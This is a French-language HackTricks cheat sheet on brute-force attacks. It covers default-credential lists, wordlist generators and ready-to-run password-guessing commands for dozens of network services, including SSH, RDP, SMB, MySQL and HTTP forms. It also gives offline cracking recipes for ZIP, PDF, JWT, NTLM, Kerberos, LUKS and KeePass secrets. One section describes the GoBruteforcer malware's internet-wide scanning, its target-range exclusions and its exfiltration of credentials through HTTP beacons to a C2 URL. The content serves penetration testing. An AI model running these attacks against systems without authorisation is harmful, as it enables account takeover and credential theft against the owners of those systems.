# Brute Force - Aide-mémoire

{{#include ../banners/hacktricks-training.md}}

## Identifiants par défaut

**Recherchez sur Google** les identifiants par défaut de la technologie utilisée, ou **essayez ces liens** :

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Créez vos propres dictionnaires**

Recueillez autant d’informations que possible sur la cible et générez un dictionnaire personnalisé. Voici quelques outils utiles :

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Listes de mots basées sur des sites web

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Générer des mots de passe à partir de vos connaissances sur la victime (noms, dates...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Un outil de génération de wordlists qui vous permet de fournir un ensemble de mots et d’en créer plusieurs variantes, afin de générer une wordlist unique et adaptée à une cible spécifique.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Listes de mots

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Workflow de brute force à l’échelle d’Internet (enseignements tirés des scanners basés sur Go)

Les comportements suivants ont été observés dans le workflow de scan du malware GoBruteforcer ; les valeurs exactes dépendent de l’échantillon.<sup>[[1]](#references)</sup>

- Maintenir des **pools de workers adaptés à l’architecture** (par exemple, 95 workers simultanés sur `x86_64/arm64`, 85 sur `i686`, 35 sur `armv5tel` et 50 par défaut sur les autres architectures), vérifier chaque seconde le nombre de workers actifs et en démarrer de nouveaux si celui-ci est inférieur à la cible ; chaque worker traite au maximum une adresse IP cible avant de quitter.
- Générer des **adresses IPv4 publiques aléatoires**, mais écarter les plages manifestement non routables et certaines plages évitées par l’opérateur : RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, plages `/8` fortement associées au cloud (`3/15/16/56`) et plages `/8` associées au ministère de la Défense américain (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Sonder le port du service** avec un délai d’attente court (~2s) avant de tenter des **connexions en clair** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin via HTTP/80), puis utiliser une **petite liste d’identifiants intégrée** si la récupération des identifiants du C2 échoue.
- **Exfiltrer les résultats** au moyen de petites requêtes HTTP GET de type beacon, comme `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (codes de service tels que `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), en réutilisant un User-Agent de navigateur courant pour se fondre dans le trafic.
- Le **spray phpMyAdmin** peut tester par force brute environ 80 chemins probables avec `GET /index.php?lang=en`, détecter les marqueurs PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) et analyser `codemirror.css?v=X.Y.Z` pour choisir la méthode d’authentification : les versions `<4.9` acceptent les paramètres GET `pma_username`/`pma_password` ; les versions `>=4.9` utilisent POST avec `server=1`, le jeton CSRF `token` et les mêmes identifiants.

## Services

Triés par ordre alphabétique du nom du service.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM et Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Registre Docker

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### Brute force générique HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Formulaire POST

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Pour http**s**, vous devez remplacer « http-post-form » par « **https-post-form »

### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Pour utiliser **oracle_login** avec **patator**, vous devez **installer** :

```bash
pip3 install cx_Oracle --upgrade
```

[Brute force hors ligne des hash OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**) :

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Vous pouvez télécharger le paquet `.deb` à installer depuis [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Pour le comportement du service Rexec avec authentification par mot de passe, voir [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Pour l’authentification par hôte de confiance et l’accès au terminal, voir [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Pour l’authentification par hôtes de confiance et les commandes à distance, voir [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Clés SSH faibles / PRNG prévisible de Debian

Certains systèmes présentent des failles connues dans le seed aléatoire utilisé pour générer du matériel cryptographique. Cela peut réduire considérablement l’espace de clés, qui peut alors être bruteforcé avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles de clés faibles pré-générées sont également disponibles, comme [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ et OpenMQ)

Le protocole texte STOMP est un protocole de messagerie très répandu qui **permet une communication et une interaction fluides avec des services de file d’attente de messages populaires** tels que RabbitMQ, ActiveMQ, HornetQ et OpenMQ. Il fournit une approche standardisée et efficace pour échanger des messages et effectuer diverses opérations de messagerie.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Local

### Bases de données de cracking en ligne

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 avec ou sans ESS/SSP et avec n’importe quelle valeur de challenge)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures WPA2 et archives MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes et hashes de fichiers)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Consultez ceci avant d’essayer de brute-forcer un hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Attaque zip à texte clair connu

Vous devez connaître le **texte clair** (ou une partie du texte clair) **d’un fichier contenu dans** le zip chiffré. Vous pouvez vérifier **les noms et la taille des fichiers contenus dans** un zip chiffré en exécutant : **`7z l encrypted.zip`**\
Téléchargez [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) depuis la page des versions.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Mot de passe propriétaire PDF

Pour casser un mot de passe propriétaire PDF, consultez cet article : [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Image LUKS

#### Méthode 1

Installer : [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Méthode 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Un autre tutoriel de brute force Luks : [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Clé privée PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Utilisez [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py), puis john

### Colonne protégée par mot de passe dans Open Office

Si vous avez un fichier xlsx contenant une colonne protégée par mot de passe, vous pouvez la déprotéger :

- **Importez-le dans Google Drive** et le mot de passe sera automatiquement supprimé
- Pour le **supprimer** **manuellement** :

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Certificats PFX

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Outils

**Exemples de hash :** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Listes de mots

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Outils de génération de listes de mots**

